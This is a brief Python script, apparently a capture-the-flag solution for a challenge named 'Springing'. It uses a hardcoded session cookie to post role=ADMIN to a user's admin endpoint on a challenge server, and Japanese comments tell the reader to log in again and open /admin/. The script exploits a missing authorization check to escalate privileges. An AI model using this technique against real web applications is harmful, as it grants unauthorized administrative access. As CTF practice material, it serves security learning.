# https://github.com/f2nDev/CTF-Writeups/tree/main/Springing

import requests

userid = "4a24384e-d2ac-4f6b-817d-ab3cef4bfd16"
SESSIONID = "B293243F9E94644F35CDC72E32FF0C66"

url = f"http://34.170.146.252:37059/admin/users/{userid}"
cookies = {"JSESSIONID": f"{SESSIONID}"}

req = requests.post(url, cookies=cookies, data={"role": "ADMIN"})

# サイトで再ログイン、以下にアクセス
# http://34.170.146.252:37059/admin/
